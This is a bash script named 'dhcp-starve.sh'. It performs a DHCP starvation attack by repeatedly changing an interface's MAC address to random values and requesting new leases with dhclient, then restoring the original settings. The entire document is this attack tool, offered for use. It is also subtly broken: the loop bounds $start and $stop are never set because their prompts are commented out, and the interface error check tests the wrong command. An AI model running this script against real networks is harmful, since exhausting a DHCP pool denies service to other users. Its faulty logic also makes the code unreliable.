#!/bin/bash

usage(){
	echo "Usage: ./dhcp-starve.sh <interface>"
}

if [ $# -ne 1 ]
then
	usage
else
	interface=$1
	oip=$(ifconfig $1 | grep netmask | grep -Po '(?<=inet )[\d.]+')
	onetmask=$(ifconfig $1 | grep netmask | grep -Po '(?<=netmask )[\d.]+')
	omac=$(ifconfig $1 | grep ether | grep -Po '(?<=ether )[\w.]+')
	#ipthirdoctet=$(ifconfig $1 |grep netmask|grep -Po '(?<=inet )[\d.]+'|cut -d "." -f 3)
	if [ $? -ne 0 ]
	then
		echo "[*] Invalid interface"
	else
		echo "[+] Current ip: $oip"
		echo "[+] Subnet: $onetmask"
		echo "[+] Mac Address: $omac"
		#echo "[+] Specify start host id: "
		#read start
		#echo "[+] Specify stop host id: "
		#read stop
		#diff=$(expr $stop - $start)
		for (( i=$start; i <= $stop; i++ ));
		do
			printf "."
			ifconfig $1 down
			randmac=$(echo $[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
			#ifconfig $1 192.168.${ipthirdoctet}.${i} netmask $onetmask
			ifconfig $1 hw ether $randmac
			ifconfig $1 up
			dhclient $1
		done
		ifconfig $1 down
		ifconfig $1 hw ether $omac
		ifconfig $1 $oip netmask $onetmask
		ifconfig $1 up
		echo "Done"
		ifconfig $1
	fi
fi
